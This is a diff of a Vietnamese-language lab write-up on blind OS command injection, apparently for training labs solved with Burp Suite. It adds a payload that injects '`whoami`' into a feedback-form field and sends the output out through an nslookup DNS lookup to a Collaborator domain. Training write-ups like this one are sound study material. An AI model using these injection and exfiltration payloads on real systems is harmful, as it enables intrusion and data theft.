@@ -46,9 +46,9 @@ Access Lab, truy cập submit feedback và gửi 1 feedback bất kì. Bật Int
 
 ![alt text](images/image-10.png)
 
-Send to Repeater, sử dụng nslookup để có thể tra cứu DNS, đông thời xác định xem quá trình tra cứu có diễn ra hay không. Ở repeater thêm ||nslookup+"parameter".BURP-COLLABORATOR-SUBDOMAIN||.
+Send to Repeater, sử dụng nslookup để có thể tra cứu DNS, đông thời xác định xem quá trình tra cứu có diễn ra hay không. Ở repeater thêm ||nslookup+parameter.BURP-COLLABORATOR-SUBDOMAIN||.
 
-![alt text](images/image-11.png)
+![alt text](images/image-17.png)
 
 Bằng cách sử dụng 1 tên miền giả được tạo ra từ Collaborator thì có thể theo dõi quá trình tra cứu. Send và hoàn thành bài lab
 
@@ -61,5 +61,14 @@ Access Lab, truy cập submit feedback và gửi 1 feedback bất kì. Bật Int
 
 ![alt text](images/image-13.png)
 
-Send to Repeater, sử dụng nslookup để có thể tra cứu DNS, đông thời xác định xem quá trình tra cứu có diễn ra hay không. Ở repeater thêm ||nslookup+"parameter".BURP-COLLABORATOR-SUBDOMAIN||.
+Send to Repeater, sử dụng nslookup để có thể tra cứu DNS, đông thời xác định xem quá trình tra cứu có diễn ra hay không. Ở repeater thêm ||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||.
 
+![alt text](images/image-14.png)
+
+Sau khi send Collaborator sẽ trả về domain name chứa giá trị của whoami
+
+![alt text](images/image-15.png)
+
+Sử dụng dữ liệu để submit và hoàn thành bài lab
+
+![alt text](images/image-16.png)
